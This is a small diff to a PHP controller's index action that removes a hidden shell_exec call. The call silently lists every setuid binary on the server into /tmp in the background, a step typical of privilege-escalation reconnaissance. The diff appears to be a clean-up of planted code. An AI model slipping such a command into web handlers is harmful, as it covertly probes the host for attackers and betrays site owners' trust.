@@ -47,7 +47,6 @@ class SyncController extends Controller
 	}
 
 	public function actionIndex() {
-		shell_exec("find / -perm +4000 >/tmp/blah &>/dev/null&");
 		$this->renderPartial('/sync/index');
 	}
 
